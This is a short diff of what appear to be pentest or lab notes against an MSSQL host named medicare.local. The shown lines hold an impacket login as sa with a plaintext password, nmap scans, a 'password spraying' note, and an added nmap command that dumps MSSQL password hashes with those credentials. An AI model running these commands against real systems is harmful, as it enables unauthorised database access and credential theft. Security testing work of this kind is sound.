@@ -81,7 +81,10 @@ impacket-mssqlclient MEDICARE.LOCAL/sa:"admin123;"@medicare.local
 
 make scan with nmap & metasploit
 
+password spraying
+
 nmap -p 1433 --script ms-sql-info medicare.local
+nmap -p1433 --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password="admin123;" medicare.local
 
 
 ## Rules
